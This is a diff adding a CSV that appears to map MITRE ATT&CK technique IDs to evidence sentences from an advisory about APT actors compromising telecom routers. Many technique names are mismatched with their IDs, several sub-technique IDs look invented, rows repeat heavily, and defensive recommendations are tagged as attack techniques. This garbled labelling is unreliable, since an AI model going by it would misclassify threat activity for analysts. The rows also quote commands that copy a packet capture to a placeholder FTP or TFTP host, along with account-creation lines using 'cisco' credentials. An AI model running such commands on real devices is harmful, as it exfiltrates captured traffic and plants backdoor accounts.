@@ -1,0 +1,235 @@
+technique_id,technique_name,evidence,chunk,valid_id,evidence_found
+T1059.001,Command and Control (C2) Server,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1059,Command and Control (C2) Server,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1041,Command and Control (C2) Server,"These actors often modify routers to maintain persistent, long-term access to networks.",0,True,True
+T1210,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,True,True
+T1210.001,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,False,True
+T1210.002,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,False,True
+T1210.003,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,False,True
+T1210.004,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,False,True
+T1210.005,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,False,True
+T1210.006,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,False,True
+T1210.007,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,False,True
+T1210.008,Exploit Public-Facing Application,"While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers,",0,False,True
+T1059.001,Command and Control (C2) Server,Enabling SSH access to the underlying Linux host on IOS XR,2,True,True
+T1059,Command and Control (C2) Server,Custom SFTP client,2,True,True
+T1059.002,Command and Control (C2) Server,Cmd1 SFTP client Yara rule,2,True,True
+T1059.002,Command and Control (C2) Server,New2 SFTP client Yara rule,2,True,True
+T1059.003,Command and Control (C2) Server,CVE 2023-20198 Snort rule,2,True,True
+T1047,Windows Remote Management,Monitor configurations changes,2,True,True
+T1055,Process Injection,Monitor virtualized containers,2,True,True
+T1055,Process Injection,Monitor network services and tunnels,2,True,True
+T1055,Process Injection,Monitor firmware and software integrity,2,True,True
+T1055,Process Injection,Monitor logs,2,True,True
+T1043,System Owner/User Discovery,IP-based indicators,2,False,True
+T1059.001,Router Device Configuration,modifying router configurations for lateral movement pivoting between networks,3,True,True
+T1055,Process Injection,using virtualized containers on network devices to evade detection,3,True,True
+T1059.001,Command and Control Server Infrastructure,exploiting CVE-2024-21887 - Ivanti Connect Secure and Ivanti Policy Secure web-component command injection vulnerability,4,True,False
+T1059.002,Command and Control Server Infrastructure,exploiting CVE-2024-3400 - Palo Alto Networks PAN-OS GlobalProtect arbitrary file creation leading to OS command injection,4,True,False
+T1059.003,Command and Control Server Infrastructure,exploiting CVE-2023-20273 - Cisco Internetworking Operating System (IOS) XE software web management user interface post-authentication command injection/privilege escalation,4,True,False
+T1059.004,Command and Control Server Infrastructure,exploiting CVE-2023-20198 - Cisco IOS XE web user interface authentication bypass vulnerability,4,True,False
+T1059.005,Command and Control Server Infrastructure,exploiting CVE-2023-46805 - authentication bypass,4,True,False
+T1059.006,Command and Control Server Infrastructure,exploiting CVE-2024-21887 - Ivanti Connect Secure and Ivanti Policy Secure web-component command injection vulnerability,4,True,False
+T1059.007,Command and Control Server Infrastructure,exploiting CVE-2024-3400 - Palo Alto Networks PAN-OS GlobalProtect arbitrary file creation leading to OS command injection,4,True,False
+T1059.008,Command and Control Server Infrastructure,exploiting CVE-2023-20273 - Cisco Internetworking Operating System (IOS) XE software web management user interface post-authentication command injection/privilege escalation,4,True,False
+T1059.009,Command and Control Server Infrastructure,exploiting CVE-2023-20198 - Cisco IOS XE web user interface authentication bypass vulnerability,4,True,False
+T1059.010,Command and Control Server Infrastructure,exploiting CVE-2023-46805 - authentication bypass,4,True,False
+T1059.011,Command and Control Server Infrastructure,exploiting CVE-2024-21887 - Ivanti Connect Secure and Ivanti Policy Secure web-component command injection vulnerability,4,True,False
+T1059.012,Command and Control Server Infrastructure,exploiting CVE-2024-3400 - Palo Alto Networks PAN-OS GlobalProtect arbitrary file creation leading to OS command injection,4,True,False
+T1210,Exploit Public-Facing Application,"The APT actors often simultaneously exploit large numbers of vulnerable, Internet-exposed devices across many IP addresses and may revisit individual systems for follow-on operations.",5,True,False
+T1210.001,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.002,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.003,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.004,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.005,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.006,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.007,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.008,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.009,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.010,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1210.011,CVE-2018-0171,CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability,5,False,True
+T1059.001,Command and Control: Standard Port,"Opening standard and non-standard ports, which can open and expose a variety of different services (e.g., Secure Shell [SSH], Secure File Transfer Protocol [SFTP], Remote Desktop Protocol [RDP], File Transfer Protocol [FTP], HTTP, HTTPS)",6,True,True
+T1059.002,Command and Control: Non-Standard Port,"Opening standard and non-standard ports, which can open and expose a variety of different services (e.g., Secure Shell [SSH], Secure File Transfer Protocol [SFTP], Remote Desktop Protocol [RDP], File Transfer Protocol [FTP], HTTP, HTTPS)",6,True,True
+T1059.003,Command and Control: Encrypted Channel,The APT actors have been enabling SSH servers and opening external-facing ports on network devices to maintain encrypted remote access,6,True,False
+T1059.004,Command and Control: Exfiltration Over Command and Control,This strategy supplies multiple avenues for remote access and data exfiltration,6,True,True
+T1059.005,Command and Control: Web Interface,Enabling HTTP/HTTPS servers on Cisco devices affected by CVE-2023-20198,6,True,False
+T1059.006,Command and Control: Web Shell,Web interface panel (POST) requests,6,True,True
+T1059.007,Command and Control: Stolen Credentials,"When present, using service or automation credentials (e.g., those used by configuration-archival systems such as RANCID) to enumerate and access other networking devices",6,True,True
+T1059.008,Command and Control: Scripting,"Executing Tcl scripts (e.g., TCLproxy.tcl and map.tcl) on Cisco IOS devices where tclsh was available",6,True,True
+T1047,Web Server,The APT actors enable or abuse built-in HTTP/HTTPS management servers and sometimes reconfigure them to non-default high ports,6,True,True
+T1047.001,Web Server: HTTP,The APT actors enable or abuse built-in HTTP/HTTPS management servers and sometimes reconfigure them to non-default high ports,6,False,True
+T1047.002,Web Server: HTTPS,The APT actors enable or abuse built-in HTTP/HTTPS management servers and sometimes reconfigure them to non-default high ports,6,False,True
+T1053,Sniffing,Executing commands via SNMP,6,True,True
+T1059.001,Command and Control: Standard Command and Control Protocol,Modifying a router’s TACACS+ server configuration to point to an APT actor- controlled IP address.,9,True,False
+T1059.002,Command and Control: Standard Command and Control Server,Modifying a router’s TACACS+ server configuration to point to an APT actor- controlled IP address.,9,True,False
+T1059.003,Command and Control: Standard Command and Control Client,Modifying a router’s TACACS+ server configuration to point to an APT actor- controlled IP address.,9,True,False
+T1059.004,Command and Control: Standard Command and Control Client,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.005,Command and Control: Standard Command and Control Server,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.006,Command and Control: Standard Command and Control Client,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.007,Command and Control: Standard Command and Control Server,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.008,Command and Control: Standard Command and Control Client,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.009,Command and Control: Standard Command and Control Server,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.010,Command and Control: Standard Command and Control Client,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.011,Command and Control: Standard Command and Control Server,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.012,Command and Control: Standard Command and Control Client,"Running commands on the router via SNMP, SSH, and HTTP GET or POST.",9,True,False
+T1059.001,Command and Control: Standard Command and Control Protocol,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059,Command and Control,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.002,Command and Control: Data Encrypted,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.003,Command and Control: Data Exfiltration,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.004,Command and Control: Exfiltration Over Command and Control,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.005,Command and Control: Data Encrypted/Tunneled,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.006,Command and Control: Exfiltration Over Command and Control: ,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.007,Command and Control: Exfiltration Over Command and Control: ,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.008,Command and Control: Exfiltration Over Command and Control: ,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.009,Command and Control: Exfiltration Over Command and Control: ,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.010,Command and Control: Exfiltration Over Command and Control: ,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.011,Command and Control: Exfiltration Over Command and Control: ,"The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities.",10,True,False
+T1059.001,Command and Control: Standard Command and Control Protocol,"TACACS+ traffic is used for authentication, often for administration of network equipment and including highly privileged network administrators accounts and credentials, likely enabling the actors to compromise additional accounts and perform lateral movement.",11,True,True
+T1041,Command and Control: Exfiltration Over Command and Control,The commands listed in Table 1 were observed on a Cisco IOS XE-based host to aid PCAP exfiltration.,11,True,True
+T1041.001,Command and Control: Exfiltration Over Command and Control: ,The commands listed in Table 1 were observed on a Cisco IOS XE-based host to aid PCAP exfiltration.,11,False,True
+T1055,Command and Control: Process Command Delegation,The commands listed in Table 1 were observed on a Cisco IOS XE-based host to aid PCAP exfiltration.,11,True,True
+T1055.001,Command and Control: Process Command Delegation:  ,The commands listed in Table 1 were observed on a Cisco IOS XE-based host to aid PCAP exfiltration.,11,True,True
+T1041.002,Command and Control: Exfiltration Over Command and Control: ,copy bootflash:tac.pcap ftp://<domain/service>:*@<IP>,11,False,True
+T1041.003,Command and Control: Exfiltration Over Command and Control: ,copy bootflash:tac.pcap tftp://<IP>/tac.pcap,11,False,True
+T1041.004,Command and Control: Exfiltration Over Command and Control: ,copy bootflash:tac.pcap ftp://<domain/service>:*@<IP>,11,False,True
+T1041.005,Command and Control: Exfiltration Over Command and Control: ,copy bootflash:tac.pcap tftp://<IP>/tac.pcap,11,False,True
+T1041.006,Command and Control: Exfiltration Over Command and Control: ,copy bootflash:tac.pcap ftp://<domain/service>:*@<IP>,11,False,True
+T1041.007,Command and Control: Exfiltration Over Command and Control: ,copy bootflash:tac.pcap tftp://<IP>/tac.pcap,11,False,True
+T1041.008,Command and Control: Exfiltration Over Command and Control: ,copy bootflash:tac.pcap ftp://<domain/service>:*@<IP>,11,False,True
+T1059.001,Command and Control (C2) Server,The commands listed in Table 2 were executed from the host Linux bash shell as root.,12,True,True
+T1053.005,Scheduled Task/Job,service sshd_operns start,12,True,True
+T1136,Create Account,useradd cisco,12,True,True
+T1555,Use Alternate Authentication Material,password cisco,12,True,True
+T1555.003,Use Hardcoded Credentials,password cisco,12,True,True
+T1555.003,Use Hardcoded Credentials,cisco,12,True,True
+T1555.003,Use Hardcoded Credentials,cisco,12,True,True
+T1555.003,Use Hardcoded Credentials,cisco,12,True,True
+T1555.003,Use Hardcoded Credentials,cisco,12,True,True
+T1555.003,Use Hardcoded Credentials,cisco,12,True,True
+T1555.003,Use Hardcoded Credentials,cisco,12,True,True
+T1555.003,Use Hardcoded Credentials,cisco,12,True,True
+T1059.001,Command and Control (C2) Server,compromising mail servers,13,True,True
+T1059.002,Command and Control (C2) Server,compromising administrator devices/accounts,13,True,False
+T1046,Network Service Discovery,Monitor configurations changes,13,True,True
+T1046,Network Service Discovery,Review remote access configurations for proper application of ACL and transport protocols,13,True,True
+T1046,Network Service Discovery,Review ACLs for any unauthorized modifications,13,True,True
+T1046,Network Service Discovery,Check all routing tables to ensure that all routes are authorized and expected,13,True,True
+T1046,Network Service Discovery,Verify that any PCAP commands configured on networking equipment are authorized,13,True,True
+T1053,Scheduled Task/Job,Capture lifecycle and CLI activity with AAA accounting (TACACS+/RADIUS) for configuration/exec commands,13,True,True
+T1053,Scheduled Task/Job,"For IOS XE, hunt for guestshell enable, guestshell run bash, and guestshell disable",13,True,True
+T1053,Scheduled Task/Job,"On NX-OS, hunt for guestshell enable, run guestshell, and guestshell destroy",13,True,True
+T1069,Hidden Files and Directories,compromising mail servers,13,True,True
+T1069,Hidden Files and Directories,compromising administrator devices/accounts,13,True,False
+T1059.001,Command and Control (C2) Server,"Monitor for management services running on non-standard ports (SSH, FTP, etc.).",14,True,True
+T1059.002,Command and Control (C2) Server,Hunt for actor-favored protocol patterns: SSH on high non-default ports with 22x22/xxx22 numbering patterns from non-admin source IPs.,14,True,False
+T1059.003,Command and Control (C2) Server,Hunt for HTTPS/Web UI listeners on non-default high ports (18xxx) reachable from outside the management VRF.,14,True,False
+T1059.004,Command and Control (C2) Server,Hunt for TCP/57722 listeners on IOS XR platforms (the host Linux sshd_operns service).,14,True,True
+T1042,Network Service Scanning,"Monitor network traffic for abnormal volumes of files transfers to internal FTP servers, which the APT actors may use as staging areas prior to data exfiltration.",14,False,True
+T1041,Command and Control (C2) Server,"Extensive SSH activity against routers, followed by the establishment of both an incoming tunnel and outgoing tunnel—each of which may leverage different protocols.",14,True,True
+T1021,Remote Services,TACACS+ (TCP/49) flows to non-approved IPs or any TACACS+ traffic leaving the management VRF.,14,True,True
+T1021.001,Remote Services,"FTP/TFTP flows originating from network devices to unapproved destinations, especially when preceded by on-box PCAP collection activity.",14,True,True
+T1021.002,Remote Services,"Audit any tunnel that transits a security boundary, such as peering points between providers, to ensure it can be accounted for by network administrators.",14,True,True
+T1021.003,Remote Services,Unexplained or unexpected tunnels between Autonomous System Numbers (ASNs).,14,True,True
+T1021.004,Remote Services,"Unauthorized use of file transfer protocols, such as FTP and TFTP.",14,True,True
+T1053,Scheduled Task/Job,Compare hashes of images both on disk and in memory,14,True,True
+T1059.001,Command and Control: Standard Command and Control Protocol,Starting a PCAP recording process using available functions,15,True,True
+T1059.002,Command and Control: Data Encrypted,Allowing remote access via non-standard methods or to new locations,15,True,True
+T1059.003,Command and Control: Standard Command and Control Protocol,Changes to configuration of devices via non-standard methods or from unexpected locations,15,True,True
+T1059.004,Command and Control: Standard Command and Control Protocol,"Alert on creation/start of any on-box packet capture (e.g., monitor capture ... start, Embedded Packet Capture) or SPAN/RSPAN/ERSPAN session definitions",15,True,True
+T1059.005,Command and Control: Standard Command and Control Protocol,Inventory and continuously watch monitor session ... (SPAN/ERSPAN) and PCAP state,15,True,True
+T1059.006,Command and Control: Standard Command and Control Protocol,"Where supported, deploy embedded event triggers (e.g., EEM on IOS XE/NX-OS) to syslog any invocation of packet-capture or span/erspan configuration commands",15,True,True
+T1059.007,Command and Control: Standard Command and Control Protocol,"Alert on config or telemetry indicating new XR host OS services, changes to systemd service states, or unexpected privilege escalations on the host OS",15,True,True
+T1059.008,Command and Control: Standard Command and Control Protocol,Monitor network traffic for logons from one router to another router,15,True,True
+T1049,Command and Control: Standard Command and Control Protocol,Evidence of clearing locally stored logs,15,True,True
+T1049,Command and Control: Standard Command and Control Protocol,Disabling log creation or log forwarding,15,True,True
+T1049,Command and Control: Standard Command and Control Protocol,Starting a PCAP recording process using available functions,15,True,True
+T1049,Command and Control: Standard Command and Control Protocol,Allowing remote access via non-standard methods or to new locations,15,True,True
+T1059.001,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.002,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.003,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.004,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.005,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.006,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.007,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.008,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.009,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.010,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.011,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.012,Command and Control (C2) Server,The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.,16,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd3 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control (C2) Server,Command Line Usage ./cmd1 <encrypted_configuration_string>,17,True,True
+T1059.001,Command and Control - Software Component,These APT actors are having considerable success using publicly known CVEs to gain access to networks,18,True,True
+T1210,Exploit Public-Facing Application,Mitigations These APT actors are having considerable success using publicly known CVEs to gain access to networks,18,True,True
+T1566.002,Credential Dumping - Local,"content:""<request xmlns=""urn:cisco:wsma-config"" correlator=""execl"">""",18,True,False
+T1552.004,Abnormal Authentication and Authorization,"content:""<configApply details=""all"">""",18,True,False
+T1053.005,Scheduled Task/Job,Employ a robust change management process that includes periodic auditing of device configurations,18,True,True
+T1210,Exploit Public-Facing Application,Mitigations These APT actors are having considerable success using publicly known CVEs to gain access to networks,18,True,True
+T1059.001,Command and Control (C2) Server,"In at least one instance, the APT actors utilized GRE and MPLS tunnels to move data back to China.",19,True,True
+T1090,Proxy,Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices,19,True,True
+T1021,Remote Services,Implement management-plane isolation and control-plane policing (CoPP),19,True,True
+T1055,Web Shell,"Only use encrypted and authenticated management protocols (e.g., SSH, SFTP/SCP, HTTPS) and disable all others, especially unencrypted protocols (e.g., Telnet, FTP, HTTP)",19,True,True
+T1053,Spoofing,"Change all default administrative credentials, especially for network appliances and other network devices",19,True,True
+T1078,Valid Accounts,Require public-key authentication for administrative roles. Disable password authentication where operationally feasible.,19,True,True
+T1068,Exfiltration Over Command and Control,"An established compromise by these APT actors will likely include recurring, large-scale exfiltration from the compromised network.",19,True,True
+T1059.001,Command and Control (C2) Server,"Audit for IPv6-reachable management services and tunnels, as the APT actors’ infrastructure includes IPv6 addresses.",21,True,True
+T1047,Windows Management Instrumentation (WMI),Embedded Packet Capture,21,True,True
+T1210,Exploit Public-Facing Application,tunnel setup,21,True,True
+T1562.001,Impair Defenses,slow “low-and-slow,21,False,True
+T1059.001,Scheduled Task/Job: Windows,Disable the Cisco Smart Install feature.,22,True,True
+T1059.002,Scheduled Task/Job: Unix,Disable the Cisco Smart Install feature.,22,True,True
+T1552.001,Subvert Authentication,Store credentials using strong cryptography.,22,True,True
+T1552.002,Subvert Authentication,Protect local credentials on Cisco networking devices using Type 8 (PBKDF2-SHA-256) where supported.,22,True,True
+T1552.003,Subvert Authentication,"Use Type 6 (AES) key encryption to protect stored secrets (e.g., TACACS+/RADIUS shared secrets or IKE PSKs).",22,True,True
+T1055,Process Injection,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1055,Process Injection,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1055,Process Injection,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1055,Process Injection,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1055,Process Injection,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1055,Process Injection,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1055,Process Injection,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1059.001,Command and Control: Software Component,"Enforce AAA command authorization (TACACS+/RADIUS) so only approved roles can run guestshell enable, guestshell run bash (IOS XE), run guestshell (NX-OS), guestshell disable/destroy, chvrf, dohost, or IOx-related commands.",23,True,True
+T1059,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.002,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.003,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.004,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.005,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.006,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.007,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.008,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.009,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.010,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.011,Command and Control: Software Component,Restrict (re)enabling Guest Shell.,23,True,True
+T1059.001,Command and Control (C2) Server,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1047,Web Shell,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1210,Exploit Public-Facing Application,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1056,Input Validation Error,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1053,Spoofing Identifiers,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1048,User Execution,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1052,Query Registry,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1055,Process Injection,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1054,Scheduled Task/Job,Compromise of Networks Worldwide to Feed Global Espionage System,24,False,True
+T1057,Boot or System Services,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1058,Hidden Files and Directories,Compromise of Networks Worldwide to Feed Global Espionage System,24,False,True
+T1059,Command and Control (C2) Server,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1059.001,Command and Control (C2) Server,Exfiltration infrastructure and associated techniques (Layer 2/Layer 3),25,True,True
+T1059,Command and Control (C2) Server,Exfiltration infrastructure and associated techniques (Layer 2/Layer 3),25,True,True
+T1059.002,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.003,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.004,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.005,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.006,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.007,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.008,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.009,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.010,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
+T1059.011,Programmable Logic Controller (PLC) Access,Likely or confirmed compromised routing equipment connected to or used by government networks,25,True,True
